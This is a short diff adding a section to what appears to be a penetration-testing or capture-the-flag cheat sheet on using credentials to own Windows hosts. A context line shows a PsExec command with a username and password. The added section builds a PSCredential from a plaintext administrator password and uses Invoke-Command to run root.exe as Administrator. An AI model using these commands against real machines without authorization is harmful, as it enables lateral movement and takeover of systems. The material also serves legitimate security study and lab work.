@@ -160,3 +160,21 @@ PS C:\tools\SysinternalsSuite> .\PsExec.exe \\ordws04 -u cscou\jarrieta -p nasty
 
 ## References
 > - https://blog.ropnop.com/using-credentials-to-own-windows-boxes/
+
+
+
+
+
+## Invoke command with credentials
+
+```
+$user = '.\administrator';
+$psw = '1234test';
+$secpsw = ConvertTo-SecureString $psw -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $user, $secpsw
+```
+
+```
+invoke-command -computername localhost -credential $credential
+-scriptblock {cd C:\Users\Administrator\Desktop\;C:\Users\Administrator\Desktop\root.exe}
+```
